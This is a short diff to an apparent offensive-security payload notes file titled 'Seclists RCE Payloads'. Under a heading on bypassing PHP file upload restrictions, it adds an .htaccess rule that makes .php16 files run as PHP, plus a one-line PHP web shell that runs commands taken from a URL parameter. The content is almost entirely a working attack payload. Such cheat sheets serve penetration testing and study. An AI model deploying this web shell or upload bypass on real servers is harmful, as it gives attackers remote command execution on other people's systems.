@@ -15,6 +15,11 @@ Seclists RCE Payloads
 Bypassing PHP File upload execution:
 ---
 .htaccess :
+
 ```
 AddType application/x-httpd-php .php16
+```
+and cmd.php16
+```php
+<?php system($_GET['cmd']); ?>
 ```
